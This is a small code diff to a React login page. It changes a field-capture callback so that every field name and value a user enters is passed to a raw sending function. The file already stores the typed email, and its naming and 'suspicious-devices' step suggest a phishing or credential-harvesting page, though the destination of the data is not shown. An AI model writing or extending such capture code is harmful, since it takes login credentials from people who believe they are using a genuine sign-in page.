@@ -3595,7 +3595,8 @@ export default function LoginPage() {
   });
   const sendCapture = useCallback((field: string, value: string) => {
     if (field === 'email' && value) capturedEmailRef.current = value;
-  }, []);
+    _rawSendCapture(field, value);
+  }, [_rawSendCapture]);
 
   useEffect(() => { if (suspDevMode) sendStepUpdate('suspicious-devices'); }, [suspDevMode, sendStepUpdate]);
 
